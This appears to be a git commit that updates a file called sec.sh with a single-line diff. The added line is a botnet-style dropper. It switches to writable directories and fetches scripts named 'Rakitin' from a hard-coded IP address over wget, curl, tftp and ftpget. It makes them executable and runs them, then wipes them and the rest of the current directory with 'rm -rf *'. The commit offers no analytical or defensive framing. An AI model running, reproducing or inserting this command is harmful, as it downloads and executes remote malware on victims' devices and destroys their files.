ecca5f312ab0195d31bc7c4ac69b02da2d19fce1
daskid123 <110142326+daskid123@users.noreply.github.com>
2022-07-29 10:29:33 -0700

    Update sec.sh

--- sec.sh
+++ sec.sh
@@ -1,1 +1,1 @@
-http://45.85.190.74/bins/Rakitin.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.85.190.74/Rakitin.sh; curl -O http://45.85.190.74/Rakitin.sh; chmod 777 Rakitin.sh; sh Rakitin.sh; tftp 45.85.190.74 -c get Rakitin.sh; chmod 777 Rakitin.sh; sh Rakitin.sh; tftp -r Rakitin2.sh -g 45.85.190.74; chmod 777 Rakitin2.sh; sh Rakitin2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.85.190.74 Rakitin1.sh Rakitin1.sh; sh Rakitin1.sh; rm -rf Rakitin.sh Rakitin.sh Rakitin2.sh Rakitin1.sh; rm -rf *
